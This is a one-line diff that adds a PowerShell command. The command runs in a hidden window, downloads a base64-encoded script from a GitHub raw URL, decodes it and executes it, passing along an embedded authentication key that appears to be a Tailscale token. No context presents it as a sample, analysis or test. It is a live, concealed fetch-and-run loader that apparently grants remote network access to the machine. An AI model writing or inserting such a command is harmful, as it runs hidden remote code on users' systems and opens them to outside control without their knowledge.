@@ -1,0 +1,1 @@
+ powershell -WindowStyle Hidden -c "$s=(curl.exe -sL https://raw.githubusercontent.com/shansnow89/pen/refs/heads/x/test.ps1); $b=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)); &([scriptblock]::Create($b)) -authKey 'tskey-auth-kicNXPjrEm11CNTRL-cpc5uvZ1wr4GxudCngBUr4AtK6BfxhxmM'"
